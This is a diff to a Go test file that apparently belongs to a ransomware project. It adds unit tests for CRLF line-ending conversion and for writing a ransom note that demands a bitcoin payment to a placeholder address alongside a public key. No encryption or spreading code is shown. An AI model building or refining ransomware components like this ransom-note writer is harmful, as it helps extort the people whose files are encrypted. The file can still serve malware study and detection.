@@ -3,8 +3,12 @@ package cli
 import (
 	"bytes"
 	"os"
+	"path/filepath"
+	"runtime"
 	"slices"
+	"strings"
 	"testing"
+	"text/template"
 	"time"
 
 	"github.com/marmos91/ransomware/crypto"
@@ -163,6 +167,81 @@ func TestResolveRansomTemplate(t *testing.T) {
 			t.Fatalf("got %q", got)
 		}
 	})
+}
+
+func TestToCRLF(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{"unix lf", "a\nb\n", "a\r\nb\r\n"},
+		{"already crlf", "a\r\nb\r\n", "a\r\nb\r\n"},
+		{"mixed", "a\nb\r\nc\r", "a\r\nb\r\nc\r\n"},
+		{"no newline", "hello", "hello"},
+		{"empty", "", ""},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := toCRLF(tc.input); got != tc.want {
+				t.Fatalf("got %q, want %q", got, tc.want)
+			}
+		})
+	}
+}
+
+func TestFormatRansomNote(t *testing.T) {
+	input := "a\nb\n"
+	got := formatRansomNote(input)
+	if runtime.GOOS == "windows" {
+		if got != "a\r\nb\r\n" {
+			t.Fatalf("windows formatRansomNote: got %q", got)
+		}
+		return
+	}
+	if got != input {
+		t.Fatalf("non-windows formatRansomNote should be unchanged: got %q", got)
+	}
+}
+
+func TestWriteRansomNote_LineEndings(t *testing.T) {
+	k := setupTestKeys(t)
+	dir := t.TempDir()
+
+	tmpl, err := template.New("ransom").Parse("Pay {{.BitcoinCount}}\nTo {{.BitcoinAddress}}\n{{.PublicKey}}")
+	if err != nil {
+		t.Fatalf("parse template: %v", err)
+	}
+
+	if err := writeRansomNote(dir, "NOTE.txt", tmpl, k.Keypair.Public, "bc1addr", 1.5); err != nil {
+		t.Fatalf("writeRansomNote: %v", err)
+	}
+
+	got, err := os.ReadFile(filepath.Join(dir, "NOTE.txt"))
+	if err != nil {
+		t.Fatalf("read note: %v", err)
+	}
+
+	wantPrefix := formatRansomNote("Pay 1.5\nTo bc1addr\n")
+	if !strings.HasPrefix(string(got), wantPrefix) {
+		t.Fatalf("unexpected note prefix: %q", got)
+	}
+
+	if runtime.GOOS == "windows" {
+		if bytes.Contains(got, []byte("\r\r\n")) {
+			t.Fatal("doubled CR in ransom note")
+		}
+		for i, b := range got {
+			if b == '\n' && (i == 0 || got[i-1] != '\r') {
+				t.Fatalf("bare LF at offset %d", i)
+			}
+		}
+		return
+	}
+
+	if bytes.Contains(got, []byte("\r")) {
+		t.Fatal("unexpected CR in non-windows ransom note")
+	}
 }
 
 func TestValidateEncSuffix(t *testing.T) {
